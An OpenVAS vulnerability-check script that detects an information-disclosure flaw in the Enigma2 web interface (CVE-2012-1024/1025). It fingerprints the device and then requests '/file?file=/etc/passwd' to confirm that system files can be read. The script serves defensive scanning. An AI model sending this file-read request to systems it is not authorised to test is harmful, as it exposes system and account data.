###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_enigma2_51330.nasl 12 2013-10-27 11:15:33Z jan $
#
# Enigma2 'file' Parameter Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Enigma2 is prone to an information-disclosure vulnerability because it
fails to sufficiently validate user-supplied data.

An attacker can exploit this issue to download local files in the
context of the webserver process. This may allow the attacker to
obtain sensitive information; other attacks are also possible.";


if (description)
{
 script_id(103381);
 script_bugtraq_id(51330);
 script_version ("$Revision: 12 $");
 script_cve_id("CVE-2012-1024", "CVE-2012-1025");
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("Enigma2 'file' Parameter Information Disclosure Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/51330");
 script_xref(name : "URL" , value : "http://dream.reichholf.net/wiki/Enigma2");

 script_tag(name:"risk_factor", value:"Medium");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-01-10 10:48:24 +0100 (Tue, 10 Jan 2012)");
 script_description(desc);
 script_summary("Determine if Enigma2 is prone to an information-disclosure vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

url = "/web/movielist.rss"; 

if(http_vuln_check(port:port, url:url,pattern:"Enigma2 Movielist")) {

  url = "/file?file=/etc/passwd";

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:.*:")) {
     
    security_warning(port:port);
    exit(0);

  }  

}


exit(0);
